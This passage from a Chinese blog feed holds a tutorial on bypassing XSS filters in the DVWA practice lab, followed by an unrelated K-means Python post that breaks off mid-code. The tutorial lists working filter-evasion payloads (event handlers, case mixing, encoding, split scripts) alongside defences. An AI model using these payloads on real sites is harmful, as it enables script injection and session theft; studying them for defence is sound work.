alt></p><p>关于上图代码中的正则表达式的说明如下，正则的更多语法和说明请参考文末链接。</p><table><thead><tr><th>代码</th><th>说明</th></tr></thead><tbody><tr><td>.</td><td>匹配除换行符以外的任意字符</td></tr><tr><td>*</td><td>重复零次或更多次</td></tr></tbody></table><blockquote><p>我们已经提到了怎么重复单个字符（直接在字符后面加上限定符就行了）；但如果想要重复多个字符又该怎么办？你可以用小括号来指定子表达式(也叫做分组)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作(后面会有介绍)。</p></blockquote><p>可以看到对<code>&lt;script</code>做了正则搜索<code>(.*)</code>和大小写过滤<code>/i</code>，双写和大小写混淆不再有效，但没有做更多限制。因此可以选择放弃使用<code>&lt;script&gt;</code>标签，转而利用事件实现XSS。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">""</span> onerror=<span class="string">"alert(1)"</span>/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(<span class="number">1</span>) style=<span class="string">"display:none"</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS会把用户输入的数据“存储”在服务器端，又称为“持久型XSS”。<br>攻击者事先将恶意js代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意js代码的页面就会执行恶意代码，不需单击即可触发。</p><h4 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h4><p>多见于网页留言板、评论等，常见应对方法包括在前端或后台限制输入长度、或做敏感字符过滤等。</p><h5 id="限制长度的应对"><a href="#限制长度的应对" class="headerlink" title="限制长度的应对"></a>限制长度的应对</h5><p>前端限制长度只需f12开控制台更改代码即可，也可采用抓包更改传输数据。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-98d7af79b13237b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-950ab38c647e8f74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>后台数据库限制长度可采用注释绕过或拼接绕过，其中“利用注释绕过”这一方法现举例如下。<br>此处先提交<code>*/cookie&lt;/script&gt;</code>是由于后台的留言按时间倒序显示，因此会拼接为<code>&lt;script&gt;alert(doucument./*被注释的代码*/cookie)&lt;/script&gt;</code>。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-65e76f923efc845b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-252c62afc63eecc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-f6564ac47a83c572.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h5 id="过滤字符的应对-1"><a href="#过滤字符的应对-1" class="headerlink" title="过滤字符的应对"></a>过滤字符的应对</h5><p>此处以DVWA为例。<br><strong>在Medium级别中，关键代码如下所示：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-db1e80815611f282.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>可以看到虽然对<code>$message</code>变量做了<code>htmlspecialchars()</code>转换，但对<code>$name</code>的过滤却只过滤了<code>&lt;script&gt;</code>字符串，因此只要从<code>$name</code>着手即可。<br>此处举两个例子，其他绕过方法详见文章“常见XSS变形”一节。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(<span class="number">1</span>)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(<span class="number">222</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/10480445-c7114d4adcb8ecee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-03323d91cefba043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><strong>在High级别中，关键代码如下所示：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-a1c1e270f557acda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到和反射型XSS的High级别相似，虽然过滤了<code>&lt;script</code>标签，但没有做更多过滤，可以创建事件以进行XSS攻击。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-05a30cde12b4ceb7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>更多过滤和绕过方法可以参考去年杭电week2的web题wp：<br><a href="https://github.com/vidar-team/Hgame2018_writeup/blob/master/week2/official_wp/week2_web_wp.pdf" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2018_writeup/blob/master/week2/official_wp/week2_web_wp.pdf</a></p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS是一种基于DOM树的XSS，通过修改页面的DOM（Document Object Model，文档对象模型）节点形成XSS。<br>例如服务器端经常使用<code>document.boby.innerHtml</code>等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。如果按照“是否保存在服务器端”来划分，DOM型XSS也是反射型XSS。</p><h4 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h4><p>可能触发DOM型XSS的属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.referer 属性</span><br><span class="line">window.name 属性</span><br><span class="line">location 属性</span><br><span class="line">innerHTML 属性</span><br><span class="line">documen.write 属性</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>此处仍以DVWA为例。<br><strong>在Medium级别中，代码如下</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123; </span><br><span class="line">    $default = $_GET[<span class="string">'default'</span>]; </span><br><span class="line">    <span class="comment"># Do not allow script tags </span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123; </span><br><span class="line">        header (<span class="string">"location: ?default=English"</span>); </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看出过滤了<code>&lt;script</code>，因此可以选择利用事件，构建语句：<code>&lt;img src=&#39;x&#39; onerror=&#39;alert(1)&#39;&gt;</code>，但输入后无事发生（。查看源代码：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-0d212a81b73d1ddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以发现语句被插入到了value值中。为此，需要闭合前面的标签，即<code>&lt;select&gt;</code>和<code>&lt;option</code>。构建exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?default=English&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=&apos;x&apos; onerror=&apos;alert(1)&apos;&gt;</span><br></pre></td></tr></table></figure><p>此时拼接如下图：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-b03ea88e839bb9a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><strong>在High级别中，代码如下</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123; </span><br><span class="line">    <span class="comment"># White list the allowable languages </span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"French"</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"English"</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"German"</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"Spanish"</span>: </span><br><span class="line">            <span class="comment"># ok </span></span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">default</span>: </span><br><span class="line">            header (<span class="string">"location: ?default=English"</span>); </span><br><span class="line">            <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>url中字符<code>#</code>后的数据不会发送到服务器端，从而绕过服务端过滤。构造exp为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h2 id="常见XSS变形"><a href="#常见XSS变形" class="headerlink" title="常见XSS变形"></a>常见XSS变形</h2><p>根据过滤代码的写法采取不同的变形以绕过过滤，常见的有以下几种。</p><h4 id="扰乱过滤规则"><a href="#扰乱过滤规则" class="headerlink" title="扰乱过滤规则"></a>扰乱过滤规则</h4><h5 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;Script&gt;alert(<span class="number">1</span>)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure><h5 id="引号的引用"><a href="#引号的引用" class="headerlink" title="引号的引用"></a>引号的引用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@ 无引号</span><br><span class="line">&lt;Img sRc=<span class="comment"># Onerror=alert(/xss/) /&gt;</span></span><br><span class="line">@ 单引号</span><br><span class="line">&lt;Img sRc=<span class="string">'#'</span> Onerror=<span class="string">'alert(/xss/)'</span> /&gt;</span><br><span class="line">@ 双引号</span><br><span class="line">&lt;Img sRc=<span class="string">"#"</span> Onerror=<span class="string">"alert(/xss/)"</span> /&gt;</span><br></pre></td></tr></table></figure><p>表格引用自 <a href="https://blog.csdn.net/n1ngsec/article/details/11909449" target="_blank" rel="noopener">XSS绕过 - N1nG - CSDN</a></p><table><thead><tr><th>类型</th><th>写法</th></tr></thead><tbody><tr><td>一个正常的XSS输入</td><td>\<img src="javascript:alert(0);"></td></tr><tr><td>转换大小写后的XSS</td><td>\<img src="javascript:alert(0);"></td></tr><tr><td>大小写混淆的XSS</td><td>\<img src="jaVasCript:alert(0);"></td></tr><tr><td>不用双引号,而是使用单引号的XSS</td><td>\<img src="javascript:alert(0);"></td></tr><tr><td>不使用引号的XSS</td><td>\<img src="javascript:alert(0);"></td></tr></tbody></table><p>关于引号的作用，请阅读<a href="https://www.zhihu.com/question/27646993/answer/42865322" target="_blank" rel="noopener">XSS 攻击时怎么绕过 htmlspecialchars 函数呢？ - 梧桐雨的回答 - 知乎</a>及文末拓展阅读。</p><h4 id="利用-代替空格"><a href="#利用-代替空格" class="headerlink" title="利用 / 代替空格"></a>利用 / 代替空格</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img/sRc=<span class="string">'#'</span>/Onerror=<span class="string">'alert(/xss/)'</span> /&gt;</span><br></pre></td></tr></table></figure><h4 id="CSS中变形"><a href="#CSS中变形" class="headerlink" title="CSS中变形"></a>CSS中变形</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@ 使用全角字符</span><br><span class="line">&lt;style&gt;body&#123;background-image:ｅｘｐｒｅｓｓｉｏｎ(alert(/xss/));&#125;&lt;/style&gt;    </span><br><span class="line">@ 注释会被浏览器忽略</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body&#123;background-image:expre<span class="comment">/***/</span>ssion(alert(/xss/))&#125;</span><br><span class="line">&lt;/style&gt;    </span><br><span class="line">@ 样式表中的\ 和\<span class="number">0</span> 同样会被浏览器忽略</span><br><span class="line">&lt;style&gt;@import <span class="string">'javasc\ri\0pt:alert("xss")'</span>;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h4 id="利用空格、Tab或回车"><a href="#利用空格、Tab或回车" class="headerlink" title="利用空格、Tab或回车"></a>利用空格、Tab或回车</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@ 利用Tab</span><br><span class="line">&lt;A hREf=<span class="string">"j  avascript:alert(/xss/)"</span>&gt;click me!&lt;/a&gt;</span><br><span class="line">@ 利用回车</span><br><span class="line">&lt;img src=<span class="string">"javas</span></span><br><span class="line"><span class="string">cript:</span></span><br><span class="line"><span class="string">alert(/xss/)"</span> width=<span class="number">100</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ 将字符转为十进制或十六进制，例如</span><br><span class="line">a    <span class="number">97</span>     &amp;<span class="comment">#97;     &amp;#x61;   </span></span><br><span class="line">e    <span class="number">101</span>    &amp;<span class="comment">#101;    &amp;#x65;</span></span><br><span class="line">&lt;A hREf=<span class="string">"j    &amp;#97;v&amp;#x61;script:alert(/xss/)"</span>&gt;click me!&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="拆分跨站"><a href="#拆分跨站" class="headerlink" title="拆分跨站"></a>拆分跨站</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@ 拼接</span><br><span class="line">&lt;script&gt;z=&apos;alert&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;(/xss/)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(z)&lt;/script&gt;</span><br><span class="line">@ 注释</span><br><span class="line">&lt;script&gt;alert(doucument./*</span><br><span class="line">*/cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="常见应对XSS方法"><a href="#常见应对XSS方法" class="headerlink" title="常见应对XSS方法"></a>常见应对XSS方法</h2><ul><li><p>输入输出检查并对敏感字符编码，如<code>&lt;</code>转成<code>&amp;lt;</code></p><ul><li>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如<code>&lt;script&gt;</code>、<code>JavaScript</code>、<code>&lt;</code>、<code>&gt;</code>、<code>”</code>。常使用<code>preg_replace()</code>函数，如<code>preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );</code></li><li>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。如php可以使用<code>htmlentities()</code>函数及<code>htmlspecialchars()</code>函数；JavascriptEncode使用<code>escapeJavascript()</code>函数来转义<code>、&lt;&gt;\&amp;#</code>等，同时要求输出变量必须在引号内部。在Java中也存在第三方组件支持过滤XSS漏洞，如JSOUP、OWASP Esapi、xssprotext等。</li></ul></li><li><p>黑名单，白名单</p><ul><li>对于富文本的过滤，需要考虑输入过滤，严格禁止“事件”。同时禁止一些威胁的标签：<code>&lt;iframe&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;form&gt;</code>等。</li><li>在标签的选择上，应该使用白名单，如只允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等比较安全的标签</li></ul></li></ul><h2 id="参考资料-amp-拓展阅读"><a href="#参考资料-amp-拓展阅读" class="headerlink" title="参考资料&amp;拓展阅读"></a>参考资料&amp;拓展阅读</h2><ul><li><a href="https://blog.csdn.net/xiaowhite_meng/article/details/80143936" target="_blank" rel="noopener">XSS简介 - xiaoWhite_meng - CSDN</a></li><li><a href="https://blog.csdn.net/qq_31481187/article/details/53027208" target="_blank" rel="noopener">XSS 漏洞总结 - 4ct10n - CSDN</a></li><li><a href="https://www.freebuf.com/articles/web/123779.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之XSS - lonehand - Freebuf</a></li><li><a href="https://blog.csdn.net/ski_12/article/details/60468362" target="_blank" rel="noopener">关于DOM型XSS漏洞的学习笔记 - Mi1k7ea - CSDN</a></li><li><a href="http://lawlietweb.com/2017/12/21/DOM%20XSS/" target="_blank" rel="noopener">dvwa DOM型XSS - C1imber’s Blog</a></li><li><a href="https://www.jianshu.com/p/a5ff8a23b423" target="_blank" rel="noopener">前端常见的攻击方式及预防方法 - 大颓宝宝 - 简书</a></li><li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank" rel="noopener">Cross-site scripting - WikiPedia</a></li></ul><hr><ul><li><a href="https://www.zhihu.com/question/26628342/answer/33504799" target="_blank" rel="noopener">DOM-based XSS 与存储性 XSS、反射型 XSS 有什么区别？ - 梧桐雨的回答 - 知乎</a></li><li><a href="http://lawlietweb.com/2018/09/02/2018-09-02/" target="_blank" rel="noopener">记一次有意思的XSS绕过之奇葩的中文尖括号 - C1imber’s Blog</a></li><li><a href="https://xz.aliyun.com/t/2757" target="_blank" rel="noopener">代码审计Day12 – 误用htmlentities函数引发的漏洞 -  红日安全团队 - 先知社区</a></li><li><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">正则表达式30分钟入门教程v2.3.5 - deerchao</a></li><li><a href="https://www.freebuf.com/sectool/102661.html" target="_blank" rel="noopener">新手指南：手把手教你如何搭建自己的渗透测试环境 - felix - Freebuf</a></li></ul><hr><ul><li><a href="https://blog.csdn.net/u013068862/article/details/80228481" target="_blank" rel="noopener">【WAMP】wamp服务器让局域网用户访问，403forbidden 解决办法</a></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K-means的python实现</title>
      <link href="/2018/04/13/%E4%BB%93%E5%BA%93%EF%BC%9AK-Means%E7%9A%84python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2018/04/13/%E4%BB%93%E5%BA%93%EF%BC%9AK-Means%E7%9A%84python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>爆肝一天写完了，只是最基础的KM<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>思路还挺简单的可惜架不住我脑残（……）<br>判断相等的while有问题会多跑好多次，还在想怎么改<br>所用数据集：<br><a href="http://archive.ics.uci.edu/ml/machine-learning-databases/iris/iris.data" target="_blank" rel="noopener">http://archive.ics.uci.edu/ml/machine-learning-databases/iris/iris.data</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●K-means v1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">作者：Kadoya</span></span><br><span class="line"><span class="string">创建日期：18.4.12</span></span><br><span class="line"><span class="string">最近修改时间：18.4.13</span></span><br><span class="line"><span class="string">程序目的：聚类</span></span><br><span class="line"><span class="string">主要算法说明：</span></span><br><span class="line"><span class="string">        1.随机选择k个数据点作为质心以分成k个分组</span></span><br><span class="line"><span class="string">        2.分别计算每个点离每个质心的欧几里得距离，选距离最小的分成一组</span></span><br><span class="line"><span class="string">        3.每组选出新的虚拟质心，这个质心不用落到具体的数据点上</span></span><br><span class="line"><span class="string">        4.再次计算每个点离新质心的欧几里得距离并重复以上步骤直至分组前后没有变化</span></span><br><span class="line"><span class="string">程序备注：</span></span><br><span class="line"><span class="string">        1.iris只有3和4，即花瓣宽度和花瓣长度对区分有用</span></span><br><span class="line"><span class="string">        2.雨血敢出敢买所以求你了快出（</span></span><br><span class="line"><span class="string">        3.想玩牧羊人之心！跪求公测！</span></span><br><span class="line"><span class="string">更新历史：</span></span><br><span class="line"><span class="string">        4.13 v1.0</span></span><br><span class="line"><span class="string">            ①基本功能完成，小bug不计其数，智障操作不计其数</span></span><br><span class="line"><span class="string">Attribute Information:</span></span><br><span class="line"><span class="string">   1. sepal length in cm</span></span><br><span class="line"><span class="string">   2. sepal width in cm</span></span><br><span class="line"><span class="string">   3. petal length in cm</span></span><br><span class="line"><span class="string">   4. petal width in cm</span></span><br><span class="line"><span class="string">   5. class: </span></span><br><span class="line"><span class="string">      -- Iris Setosa</span></span><br><span class="line"><span class="string">      -- Iris Versicolour</span></span><br><span class="line"><span class="string">      -- Iris Virginica</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stardust</span><span class="params">(data,k)</span>:</span><span class="comment">#基本处理  参数：原始数据，质心数</span></span><br><span class="line">    lost_star=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:<span class="comment">#只有3,4列有用所以[2:-1]</span></span><br><span class="line">        lost_star.append(i.strip(<span class="string">'\n'</span>).split(<span class="string">','</span>)[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">    lost_star=[list(map(float,i)) <span class="keyword">for</span> i <span class="keyword">in</span> lost_star]<span class="comment">#str转为float</span></span><br><span class="line">    <span class="comment">#centroids=[random.choice(lost_star) for i in range(k)]</span></span><br><span class="line">    <span class="comment">#↑会选到重复的，老老实实展开写了</span></span><br><span class="line">    sss=lost_star[:]</span><br><span class="line">    centroids=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):<span class="comment">#随机选k个数据点作为质心</span></span><br><span class="line">        a=random.choice(sss)</span><br><span class="line">        sss.remove(a)</span><br><span class="line">        centroids+=[a]</span><br><span class="line">    <span class="keyword">return</span> lost_star,centroids  <span class="comment">#返回数据集和质心</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(lost_star,centroids)</span>:</span><span class="comment">#计算欧几里得距离并分组且返回新质心  参数：数据集list，质心list</span></span><br><span class="line">    scrap,new,puppet=&#123;&#125;,[],[]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> range(len(lost_star)):<span class="comment">#遍历数据集里的点</span></span><br><span class="line">        star=&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> centroids:<span class="comment">#计算该点和不同质点间的距离(cost)</span></span><br><span class="line">            cost=sum([pow(lost_star[s][j]-c[j],<span class="number">2</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(len(lost_star[s]))])</span><br><span class="line">            star[centroids.index(c)]=cost   <span class="comment">#key:value=质心id:数据点到该质心的距离</span></span><br><span class="line">        cen=[i <span class="keyword">for</span> i,j <span class="keyword">in</span> star.items() <span class="keyword">if</span> j == min(star.values())][<span class="number">0</span>]<span class="comment">#最近的质心的id</span></span><br><span class="line">        <span class="keyword">if</span> cen <span class="keyword">not</span> <span class="keyword">in</span> scrap.keys():<span class="comment">#分类，key:value=质心id:属于该质心的点的列表</span></span><br><span class="line">            scrap[cen]=[]</span><br><span class="line">        scrap[cen].append(s)</span><br><span class="line">        puppet.append(cen)<span class="comment">#这个才是！要传回去的列表！（</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> scrap.values():<span class="comment">#计算新的质心</span></span><br><span class="line">        n=[sum([lost_star[j][k] <span class="keyword">for</span> j <span class="keyword">in</span> i])/len(i) <span class="keyword">for</span> k <span class="keyword">in</span> range(len(lost_star[<span class="number">0</span>]))]</span><br><span class="line">        new.append(n)</span><br><span class="line">    <span class="keyword">return</span> puppet,new</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kmeans</span><span class="params">(lost_star,centroids)</span>:</span><span class="comment">#参数：数据集，质心</span></span><br><span class="line">    puppet,new=cost(lost_star,centroids)</span><br><span class="line">    puppet2,new2=cost(lost_star,new)</span><br><span class="line">    <span class="keyword">while</span> puppet!=puppet2:<span class="comment">#分组前后不同的话就重来</span></span><br><span class="line">        puppet,new=cost(lost_star,new2)</span><br><span class="line">        puppet2,new2=cost(lost_star,new)</span><br><span class="line">    <span class="keyword">return</span> puppet,new</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> datetime</span><br><span class="line">    starttime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line">    path = <span class="string">r'data.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    k=<span class="number">3</span></span><br><span class="line">    lost_star,centroids=stardust(data,k)<span class="comment">#拿到数据集和质心</span></span><br><span class="line">    puppet,new=kmeans(lost_star,centroids)</span><br><span class="line">    print(puppet,new)</span><br><span class="line">    </span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">print</span> (endtime - starttime)</span><br></pre></td></tr></table></figure></the></p><p>图像代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 